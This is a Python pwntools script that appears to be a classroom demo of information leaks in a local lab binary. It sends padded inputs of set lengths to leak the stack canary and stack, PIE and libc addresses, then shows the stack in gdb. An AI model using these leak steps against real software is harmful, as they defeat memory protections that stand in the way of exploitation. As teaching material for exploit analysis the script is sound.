from pwn import *

###Setup
context.log_level = 'critical'

###Util
def normal():
    print('\n================== prompt input ===================')
    print(f"'\033[33m{'a'*0x8}\033[0m'")
    r.sendafter('Data : ','a'*0x8)
    print('\n================== prompt output ==================')
    res = r.recvline()
    print('\033[31mrecieved\033[0m :',res)

def leak_canary():
    print('\n================== prompt input ===================')
    print(f"'\033[33m{'a'*0x19}\033[0m'")
    r.sendafter('Data : ','a'*0x19)
    print('\n================== prompt output ==================')
    res = r.recvline()
    print('\033[31mrecieved\033[0m :',res)
    print('\033[31mcanary\033[0m :',hex(u64(b'\x00'+res[0x19:0x19+7])))

def leak_stack():
    print('\n================== prompt input ===================')
    print(f"'\033[33m{'a'*0x20}\033[0m'")
    r.sendafter('Data : ','a'*0x20)
    print('\n================== prompt output ==================')
    res = r.recvline()
    print('\033[31mrecieved\033[0m :',res)
    print('\033[31mleaked address\033[0m :',hex(u64(res[0x20:-1]+b'\x00\x00')))

def leak_code():
    print('\n================== prompt input ===================')
    print(f"'\033[33m{'a'*0x28}\033[0m'")
    r.sendafter('Data : ','a'*0x28)
    print('\n================== prompt output ==================')
    res = r.recvline()
    print('\033[31mrecieved\033[0m :',res)
    print('\033[31mleaked address\033[0m :',hex(u64(res[0x28:-1]+b'\x00\x00')))

def leak_libc():
    print('\n================== prompt input ===================')
    print(f"'\033[33m{'a'*0x38}\033[0m'")
    r.sendafter('Data : ','a'*0x38)
    print('\n================== prompt output ==================')
    res = r.recvline()
    print('\033[31mrecieved\033[0m :',res)
    print('\033[31mleaked address\033[0m :',hex(u64(res[0x38:-1]+b'\x00\x00')))

def cmd(command):
    g.sendlineafter('$ ',command)

###Demo
print('=================== source code ===================')
os.system('pygmentize leak.c')

r = process('./L',env={'LD_PRELOAD':'./libc-2.31.so'})
pid = proc.pid_by_name('L')[0]

g = process('gdb')
cmd(f'att {pid}')
cmd('b getchar')
cmd('c')

if sys.argv[1]=='normal':
    normal()
elif sys.argv[1]=='canary':
    leak_canary()
elif sys.argv[1]=='stack':
    leak_stack()
elif sys.argv[1]=='pie':
    leak_code()
elif sys.argv[1]=='libc':
    leak_libc()
else:
    print('invalid option')
    exit()

print('\n====================== stack ======================')
cmd('telescope $rsp+8 20')
print(g.recvuntil('gdb-peda',drop=True).decode(),end='')
print('\033[0m',end='')
g.close()

print('\n====================== return =====================')
r.send(' ')
print(r.recvline())
print('')
